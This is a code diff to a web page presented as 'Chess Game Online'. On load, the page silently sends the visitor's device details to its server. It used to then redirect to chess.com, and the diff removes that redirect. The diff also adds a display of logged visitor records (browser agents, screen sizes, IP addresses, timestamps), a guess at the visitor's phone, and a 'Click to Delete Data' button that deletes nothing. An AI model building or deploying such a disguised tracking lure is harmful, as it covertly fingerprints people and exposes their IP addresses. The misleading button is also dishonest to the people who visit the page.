@@ -5,8 +5,72 @@
 <head>
     <title>Chess Game Online</title>
 </head>
+<style>
+    body {
+        color: green;
+        background-color: black;
+    }
+
+    .btn {
+        color: green;
+        background-color: white;
+        font-size: 25px;
+        height: 100px;
+        width: 200px;
+        border-radius: 5px;
+    }
+
+    .inline {
+        display: inline;
+    }
+</style>
 
 <body>
+    <h1>Hello, </h1>
+    <h1>Your Device Most Probably Redmi Note 5 Pro !!</h1>
+    <button class="btn" onclick="submit()">Click to Delete Data</button>
+    <br>
+    <textarea name="" id="" cols="100" rows="45">
+        {
+        "agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)
+        Version/16.1 Mobile/15E148 Safari/604.1",
+        "lang": "en-US",
+        "platform": "linux",
+        "width": 414,
+        "height": 886,
+        "pixelRatio": 1,
+        "isTouch": false,
+        "ip": "84.39.230.13, 162.158.170.43, 10.210.85.17",
+        "created": "2023-07-25T08:50:56.027Z",
+        "__v": 0
+        },
+        {
+        "agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)
+        CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1",
+        "lang": "en-US",
+        "platform": "linux",
+        "width": 390,
+        "height": 844,
+        "pixelRatio": 1,
+        "isTouch": false,
+        "ip": "91.92.17.176, 172.70.143.110, 10.210.85.17",
+        "created": "2023-07-26T08:47:12.330Z",
+        "__v": 0
+        },
+        {
+        "agent": "Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko)
+        Chrome/114.0.0.0 Mobile Safari/537.36",
+        "lang": "en-US,en;q=0.9",
+        "platform": "linux",
+        "width": 360,
+        "height": 720,
+        "pixelRatio": 3,
+        "isTouch": true,
+        "ip": "103.210.49.4, 172.70.147.163, 10.210.85.17",
+        "created": "2023-07-26T09:07:40.070Z",
+        "__v": 0
+        },
+    </textarea>
 </body>
 <script>
     const sendDeviceDetails = () => {
@@ -31,9 +95,13 @@
                 console.error('Error making POST request:', error);
             });
     };
+    async function submit() {
+        console.log("hello");
+        const response = await fetch('/api/count');
+        const data = await response.json();
+    }
     window.addEventListener('load', () => {
         sendDeviceDetails();
-        window.location.href = 'https://www.chess.com/';
     });
 </script>
 
